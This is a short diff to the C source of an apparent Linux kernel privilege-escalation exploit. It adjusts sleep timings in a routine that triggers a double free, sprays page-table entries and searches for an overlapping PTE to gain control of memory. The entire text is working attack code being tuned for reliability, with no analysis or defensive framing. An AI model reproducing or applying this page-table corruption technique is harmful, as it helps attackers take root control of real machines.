@@ -344,8 +344,8 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	alloc_intermed_buf_hdr(0, &df_ip_header);
 
 	// allocate overlapping PMD page (overlaps with PTE)
-	printf("[*] SLEEP 2s after double free...\n");
-	sleep(2);
+	printf("[*] SLEEP 1s after double free...\n");
+	sleep(1);
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
@@ -355,12 +355,13 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	// find overlapped PTE area
 	pte_area = NULL;
-	//printf("[*] SLEEP 2s before search...\n");
-	//sleep(2);
+	//printf("[*] SLEEP 1s before search...\n");
+	//sleep(1);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 	{
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
 		printf("sleep 1, i = %d \n", i);
+		sleep(1);
 		// pte entry pte[0] should be the PFN+flags for &_pmd_area
 		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
 		if (*test_target_addr != 0x41)
